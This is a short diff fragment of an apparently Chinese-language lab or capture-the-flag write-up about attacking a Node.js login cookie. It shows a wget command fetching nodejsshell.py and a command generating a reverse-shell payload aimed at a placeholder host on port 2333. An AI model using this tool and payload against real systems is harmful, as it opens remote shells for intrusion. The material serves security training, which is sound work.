@@ -1,7 +1,7 @@
 一个登录页面，登录后cookie中base64编码的身份信息。
 ```
 
-下载所需脚本名为nodejsshell.py：
+kali中下载所需脚本名为nodejsshell.py：
 wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py -o nodejsshell.py
 
 生成 payload ：py2 .\nodejsshell.py x.x.x.x 2333
